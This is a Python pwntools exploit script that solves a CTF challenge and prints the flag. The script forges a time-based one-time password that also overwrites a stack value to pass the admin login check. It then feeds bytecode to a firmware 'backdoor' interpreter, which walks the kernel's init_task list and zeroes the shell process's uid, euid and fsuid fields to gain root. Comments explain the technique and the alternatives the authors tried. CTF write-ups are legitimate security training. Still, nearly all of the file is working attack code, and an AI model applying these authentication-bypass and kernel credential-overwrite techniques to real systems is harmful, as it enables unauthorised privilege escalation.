# Sadly, solved 5min after CTF :(
# Flag: flag{banging_with_my_big_bag_of_backdoors}
import datetime
from pwn import *
from cint import U64

if args.REMOTE:
    p = remote(args.HOST or 'flu.xxx', int(args.PORT or 2030))
else:
    p = process('./run-qemu.sh')

p.recvuntil('Enter Username:')
p.sendline('guest')
p.recvuntil('Enter Password:')
p.sendline('guest')
p.recvuntil('Enter One Time Password:')
p.sendline('otp-guest')

p.recvuntil('Get shell access')
p.sendline('time')
p.recvuntil('\n', drop=True) # redundant newlines
p.recvuntil('\n', drop=True)
p.recvuntil('\n', drop=True) # b'time\r'
t = p.recvuntil('\r\n', drop=True).rstrip(b'\r')
print("Received time string:", repr(t))

dt = datetime.datetime.strptime(t.decode(), '%a %b %d %H:%M:%S %Z %Y')
print("Got    dt:", dt)
print("Parsed dt:", dt)

def f(dt):
    #cotp = U64(dt.year) << 32
    cotp = 1 << 32 ## NEEDED FOR validPass stack overwrite!
    cotp += U64(dt.month) << 24
    cotp += U64(dt.day) << 16
    cotp += U64(dt.hour) << 8
    cotp += dt.minute
    return cotp.value

# Get otp
# Note that we commented out the year from cotp calculation
# this is bcoz we need that bytes in input to be exactly 1
# so a proper value on stack is overwritten
# so 'validPass' passes...
otp1 = hex(f(dt))

# we use otp2 to add the final year value
otp2 = (U64(dt.year) << 32) - (1<<32)
# need to bswap!
def swap64(i):
    return struct.unpack("<Q", struct.pack(">Q", i))[0]
otp2 = swap64(otp2)
otp2 = hex(otp2)


# merge otp strings
final_otp = otp1
final_otp += ' '*(17-len(otp1))
final_otp += otp2

print("OTP :", final_otp)

p.sendline('login')

p.recvuntil('Enter Username:')
p.sendline('admin')
p.recvuntil('Enter Password:')
p.sendline('superSecretPassword123')
p.recvuntil('Enter One Time Password:')
p.sendline(final_otp)


p.sendline('save')
p.recvuntil('Enter Name:')
p.sendline('Backdoor')
p.recvuntil('Enter Data:')

# lmao, but works
def fix(v):
    return b'\\x%02x' % v

def op(opcode, val=None, val2=None):
    res = chr(opcode).encode()
    if val is not None:
        res += p64(val)
    if val2 is not None:
        res += p64(val2)
    return b''.join(map(fix, res))


#UID = 65534
#def op(nr, *args):
#    return bytes([nr]) +b''.join(x.to_bytes(8, 'little') for x in args)


"""
That was our first idea - overwrite all occurences of p32(uid)|p32(uid) in memory
However, this loop never stops, so it didn't work well.

lab0:   4: Y = 8
lab1:   7: X += Y
lab2:   0: Y = *X
lab3:   9: if Y != (p32(uid) + p32(uid)): goto lab0
lab4:   4: Y = 0
lab5:   1: *X = Y
lab6:   8: goto lab0
"""

"""
We list the 'Backdoor' state machine operations here

A = D+1

0: Y  = *X
1: *X = Y
2: B  = *X
3: *X = B
4: Y  = T[A]; A = D+9
5: X  = T[A]; A = D+9
6: X  = Y
7: X += Y
8: A = T[A]
9: A = (Y == T[A]) ? (D + 17) : (T[D + 9])

D = A
"""

# So what we do ultimately here is...
# we write 0 values to the sh task's ->cred->uid, fsuid and euid fields
# we do it by taking the init_task structure->tasks address below, and then
# dereferencing the ->next 24 times
# this gets us to the list item that corresponds to sh task
# then we move the pointer to the task_struct, then to ->cred
# then we dereference it
# and then we overwrie uid, euid, fsuid to 0

# We found the above, by simply dereferencing the `init_task->tasks->next` in GDB, as in:
#  p &((struct task_struct*)((char*)init_task->tasks->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next->next-0x1d0))->cred->fsuid.val

# We've also had some ideas, like:
# - writing to sys_call_table - we can't due to write protection (set in cr0, see https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/ for more details)
# - overwriting user space process since there is no SMEP or SMAP: however, the UEFI code executes from a separate kernel thread which doesn't have userspace process mapped in
# - ROPping - we didn't find any leak so we would have to brute addresses (too much/not feasible?)

# Really, that's &init_task->tasks - its address is known from the given System.map
init_task = 0xffffffff81a22690

out = op(5, init_task)  #   initt_task
out += (op(0) + op(6)) * 24 # y=*x, x=y

out += op(4, U64.MAX-0x1d0+1)
out += op(7)
out += op(4, 0x3c0)
out += op(7) # offset to cred, x=ttask.cred
out += op(0) # y=*x, y=cred
out += op(6) # x=y

# y=4, x+=y
out += op(4, 4)
out += op(7) # x+=4 ==> x = &uid
out += op(4, 0) # y=0
out += op(1) # *x=0

# y=0x10, x+=y
out += op(4, 0x10) # y=10
out += op(7) # x+=10
out += op(4, 0) # y=0
out += op(1) # *x=0

# y=0, x+=y
out += op(4, 8) # y=10
out += op(7) # x+=10
out += op(4, 0) # y=0
out += op(1) # *x=0

shellcode = out
p.sendline(shellcode)

p.recvuntil('Get shell access')
p.sendline('shell')
#p.sendline('sh -c "while true; do strings /dev/sdb 2>/dev/null; sleep 5; done" &')
p.sendline('sh -c "while true; do strings /dev/sdb; strings /dev/sdb; sleep 5; done" &')
p.sendline('ps aux')
p.sendline('exit')
p.recvuntil('Get shell access')

p.sendline('load')
p.sendline('Backdoor')

p.interactive()